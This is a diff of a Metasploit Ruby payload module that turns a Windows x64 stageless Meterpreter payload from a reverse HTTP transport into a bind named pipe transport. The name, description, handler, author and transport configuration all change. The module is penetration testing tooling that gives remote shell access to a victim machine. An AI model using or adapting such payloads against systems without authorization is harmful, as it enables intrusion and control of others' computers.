@@ -4,7 +4,7 @@
 ##
 
 require 'msf/core/payload/transport_config'
-require 'msf/core/handler/reverse_http'
+require 'msf/core/handler/bind_named_pipe'
 require 'msf/core/payload/windows/x64/meterpreter_loader'
 require 'msf/base/sessions/meterpreter_x64_win'
 require 'msf/base/sessions/meterpreter_options'
@@ -12,7 +12,7 @@ require 'rex/payloads/meterpreter/config'
 
 module MetasploitModule
 
-  CachedSize = 207449
+  CachedSize = 206403
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -23,13 +23,13 @@ module MetasploitModule
   def initialize(info = {})
 
     super(merge_info(info,
-      'Name'        => 'Windows Meterpreter Shell, Reverse HTTP Inline (x64)',
-      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
-      'Author'      => [ 'OJ Reeves' ],
+      'Name'        => 'Windows Meterpreter Shell, Bind Named Pipe Inline (x64)',
+      'Description' => 'Connect to victim and spawn a Meterpreter shell',
+      'Author'      => [ 'UserExistsError' ],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
       'Arch'        => ARCH_X64,
-      'Handler'     => Msf::Handler::ReverseHttp,
+      'Handler'     => Msf::Handler::BindNamedPipe,
       'Session'     => Msf::Sessions::Meterpreter_x64_Win
       ))
 
@@ -47,13 +47,13 @@ module MetasploitModule
   def generate_config(opts={})
     opts[:uuid] ||= generate_payload_uuid
 
-    # create the configuration block
+    # create the configuration block, which for staged connections is really simple.
     config_opts = {
       arch:       opts[:uuid].arch,
       exitfunk:   datastore['EXITFUNC'],
       expiration: datastore['SessionExpirationTimeout'].to_i,
       uuid:       opts[:uuid],
-      transports: [transport_config_reverse_http(opts)],
+      transports: [transport_config_bind_named_pipe(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
       ext_init:   (datastore['EXTINIT'] || ''),
       stageless:  true
@@ -66,3 +66,5 @@ module MetasploitModule
     config.to_b
   end
 end
+
+
